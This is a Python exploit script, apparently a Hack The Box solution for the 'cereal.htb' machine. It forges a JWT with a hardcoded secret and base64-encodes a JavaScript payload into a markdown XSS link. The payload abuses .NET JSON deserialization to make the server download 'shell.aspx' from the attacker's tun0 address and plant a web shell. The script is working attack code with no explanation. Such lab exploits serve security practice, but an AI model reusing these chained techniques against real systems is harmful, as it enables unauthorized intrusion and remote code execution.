#!/usr/bin/python3

import requests
import datetime
import jwt
from urllib3.exceptions import InsecureRequestWarning
import socket
import fcntl
import struct
import base64

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning) # disable https warnings

proxies={
'http': 'http://127.0.0.1:8080',
'https': 'http://127.0.0.1:8080'
}

def createJWT():
    _secret = "secretlhfIH&FY*#oysuflkhskjfhefesf"
    jwt_payload = jwt.encode(
        {"user":"randomlol","exp":datetime.datetime.utcnow() + datetime.timedelta(hours=12)},
        _secret,
        algorithm="HS256"
        )
    #print(jwt.decode(jwt_payload,_secret,algorithms=["HS256"]))
    return jwt_payload

def get_ip_address(ifname):
    s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,
        struct.pack('256s',bytes(ifname[:15],'utf-8'))
        )[20:24])


js_Payload = '''
    var JWT = '%s';
    targeturl = 'https://cereal.htb/requests';

    req = new XMLHttpRequest;
    var payload = JSON.stringify({"json": '{"$type":"Cereal.DownloadHelper, Cereal","URL":"http://%s/shell.aspx","FilePath":"C:/inetpub/source/uploads/shell.aspx"}'});

    req.onreadystatechange = function() {
    if (req.readyState == 4) {
        var id = JSON.parse(this.responseText).id;
        //console.log(id)

        req2 = new XMLHttpRequest;
        req2.open('GET', targeturl + "/" + id, false);
        req2.setRequestHeader("Authorization", "Bearer " + JWT);
        req2.send();
    }
}
req.open('POST', targeturl, false);
req.setRequestHeader("Authorization", "Bearer " + JWT);
req.setRequestHeader('Content-type', 'application/json');
req.send(payload);
    ''' % (createJWT(), get_ip_address('tun0'))


print(js_Payload)
js_payload_b64 = base64.b64encode(js_Payload.encode('utf-8'))
data = {'json': '{"title":"[XSS](javascript: eval(atob("' + js_payload_b64.decode('utf-8') + '"")))", "flavor":"banana", "color":"#f000", "description":"banana"}'}

headers = {'Authorization': 'Bearer ' + createJWT()}
print(data)
r = requests.post("https://cereal.htb/requests", headers=headers, json=data, verify=False,proxies=proxies)
print(createJWT())
